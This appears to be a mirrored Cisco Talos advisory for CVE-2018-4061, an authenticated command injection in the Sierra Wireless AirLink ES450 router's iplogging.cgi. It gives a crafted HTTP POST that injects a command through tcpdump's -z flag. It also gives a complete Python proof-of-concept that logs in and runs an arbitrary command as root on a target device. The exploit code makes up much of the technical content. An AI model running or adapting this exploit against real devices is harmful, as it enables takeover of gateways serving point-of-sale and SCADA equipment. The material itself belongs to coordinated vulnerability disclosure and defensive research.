@@ -1,0 +1,124 @@
+id: 32607
+date: 04/29/2019
+title: Sierra Wireless AirLink ES450 ACEManager iplogging.cgi Command Injection Exploit
+author: Cisco Talos
+cves: CVE-2018-4061
+
+Sierra Wireless AirLink ES450 ACEManager iplogging.cgi command injection vulnerability
+April 25, 2019
+
+CVE Number
+CVE-2018-4061
+
+Summary
+
+An exploitable command injection vulnerability exists in the ACEManager iplogging.cgi functionality of Sierra Wireless AirLink ES450 FW 4.9.3. A specially crafted HTTP request can inject arbitrary commands, resulting in arbitrary command execution. An attacker can send an authenticated HTTP request to trigger this vulnerability.
+
+
+Tested Versions
+
+Sierra Wireless AirLink ES450 FW 4.9.3
+
+
+Product URLs
+
+https://www.sierrawireless.com/products-and-solutions/routers-gateways/es450/
+CVSSv3 Score
+
+9.9 - CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+CWE
+
+CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
+Details
+
+Sierra Wireless manufactures wireless communications equipment. They provide embedded solutions and wireless hardware solutions, including both the ES450 and GX450 devices. The AirLink ES450 is an LTE gateway designed for distributed enterprise. The ES450 is typically seen connecting point-of-sale devices, remote SCADA equipment, or other business-critical equipment. The AirLink ES450 also provides a terminal server for remote out-of-band administration.
+
+ACEManager is the web server included with the AirLink ES450. This web server is responsible for the majority of interactions in the device. Some specific capabilities of the web server are routing, device reconfiguration, user authentication and certificate management. The vendor has stated that the ACEManager web application is not accessible by default from the Cellular WAN.
+
+If a request is made to /admin/tools/iplogging.cgi within ACEManager, the -z flag is not properly escaped, or removed. This flag is responsible for providing a postrotate-command to be provided to tcpdump which allows for command injection as root. This flag needs the -G flag to properly set up the rotation timeframe for the command to be executed.
+
+The following POST request will trigger the vulnerability.
+
+ POST /admin/tools/iplogging.cgi HTTP/1.1
+ Host: 192.168.13.31:9191
+ User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+ Accept: text/plain, */*; q=0.01
+ Accept-Language: en-US,en;q=0.5
+ Accept-Encoding: gzip, deflate
+ Referer: http://192.168.13.31:9191/admin/tools/iplogging.html
+ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+ X-Requested-With: XMLHttpRequest
+ Content-Length: 63
+ Cookie: token=1e9c07e135a15e40b3290c320245ca9a
+ Connection: close
+
+ tcpdumpParams=tcpdump -z reboot -G 2 -i eth0&stateRequest=start
+
+This vulnerability was discovered and tested using the AirLink ES450. This vulnerability also most likely affects the AirLink GX450 product, as well.
+Exploit Proof of Concept
+
+ #!/usr/bin/env python
+ #Author : Carl Hurd, Cisco Talos
+ import sys
+ import socket
+ import time
+ import requests
+
+ def auth(ip, port, password):
+      data = """<request xmlns="urn:acemanager">
+ <connect>
+ <login>user</login>
+ <password><![CDATA[{}]]></password>
+ </connect>
+ </request>""".format(password)
+
+      response = requests.post("http://"+ip+":"+port+"/xml/Connect.xml", data=data)
+
+       try:
+           cookies = dict(token=response.headers["Set-Cookie"].split("; ")[0][len("token="):])
+           return cookies
+      except:
+           print("Error while authenticating")
+           sys.exit(0)
+
+ def main():
+      if len(sys.argv) < 5 or len(sys.argv) > 5:
+           print("Usage : {} [ip address] [port] [password of user] [cmd to run]".format(sys.argv[0]))
+           sys.exit(0)
+
+      ip = sys.argv[1]
+      port = sys.argv[2]
+      password = sys.argv[3]
+      cmd = sys.argv[4]
+
+      print("Injecting command : {}".format(cmd))
+
+      cookies = auth(ip, port, password)
+
+      files = {'save-as-filename': (None, "iplogging_params.tcp"), 'file-location': (None, "/tmp/iplogging_params.tcp"), 'upload-file': ('exploit.xml', 'none')}
+      response = requests.post("http://"+ip+":"+port+"/cgi-bin/iplogging_upload.cgi", cookies=cookies, files=files)
+
+      response = requests.post("http://"+ip+":"+port+"/admin/tools/iplogging.cgi", cookies=cookies, data="stateRequest=getCmds")
+
+      data = "tcpdumpParams=tcpdump -z {} -G 1 -i eth0&stateRequest=start".format(cmd)
+      response = requests.post("http://"+ip+":"+port+"/admin/tools/iplogging.cgi", cookies=cookies, data=data)
+
+      response = requests.post("http://"+ip+":"+port+"/admin/tools/iplogging.cgi", cookies=cookies, data="stateRequest=queryStatus")
+
+ if __name__ == "__main__":
+     main()
+
+Timeline
+
+2018-12-14 - Vendor disclosure
+2018-12-17 - Vendor acknowledged
+2019-01-08 - Discussion to review vendor's analysis of issues
+2019-03-26 - Vendor established timelines for fix/public disclosure
+2019-04-20 - Talos provided revised CVSS score on TALOS-2018-0746, TALOS-2018-0751, TALOS-2018-0752, TALOS-2018-0755, and TALOS-2018-0756
+2019-04-25 - Public Release
+
+Credit
+
+Discovered by Carl Hurd and Jared Rittle of Cisco Talos.
+
+#  0day.today [2023-03-22]  #
